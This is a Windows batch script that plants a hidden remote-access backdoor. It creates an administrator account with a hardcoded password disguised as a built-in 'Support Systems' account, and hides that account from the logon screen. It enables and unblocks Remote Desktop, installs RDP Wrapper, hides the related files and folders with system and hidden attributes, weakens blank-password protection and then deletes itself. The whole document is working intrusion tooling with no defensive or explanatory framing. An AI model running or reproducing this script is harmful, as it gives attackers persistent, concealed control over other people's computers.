@echo off
SET user=systemw
SET pass=B2q4xx9Bp2

SET prog=wmic
REM SET syst=systeminfo.txt

REM RDP USER CREATE
SET AdmGroupSID=S-1-5-32-544
SET AdmGroup=
FOR /F "UseBackQ Tokens=1* Delims==" %%I IN (`%prog% Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) DO SET AdmGroup=%%J
SET AdmGroup=%AdmGroup:~0,-1%
net user %user% %pass% /add /active:"yes" /expires:"never" /passwordchg:"NO" /fullname:"Support Systems" /comment:"Built-in account for supported the computer/domain"
net localgroup %AdmGroup% %user% /add
SET RDPGroupSID=S-1-5-32-555
SET RDPGroup=
FOR /F "UseBackQ Tokens=1* Delims==" %%I IN (`%prog% Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) DO SET RDPGroup=%%J
SET RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" %user% /add
net accounts /forcelogoff:no /maxpwage:unlimited

REM ADD REG PARAM
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %user% /t REG_DWORD /d 0x0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Support Systems
reg add "HKLM\system\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f

netsh advfirewall firewall add rule name="allow RDP" dir=in protocol=TCP localport=3389 action=allow
"RDPWInst.exe" -i -o
"RDPWInst.exe" -w
del /f /q "install.vbs"
attrib +s +h "C:\Program Files\RDP Wrapper\*.*"
attrib +s +h "C:\Program Files\RDP Wrapper"
attrib +s +h "C:\rdp"

REM CREATE USERPROFILE DIR
@MKDIR %systemdrive%\users\%user% & attrib %systemdrive%\users\%user% +r +a +s +h

REM DEDIC INFO
REM DxDiag /whql:off /t %syst%
REM SystemInfo >> %syst%
REM IPConfig >> %syst%

REM REMOVE THIS FILE
REM DEL /F /Q %~nx0 & EXIT
DEL %0 /q


reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /

sc config TermService start= auto

net start Termservice

netsh.exe

firewall

add portopening TCP 3389 "Remote Desktop"
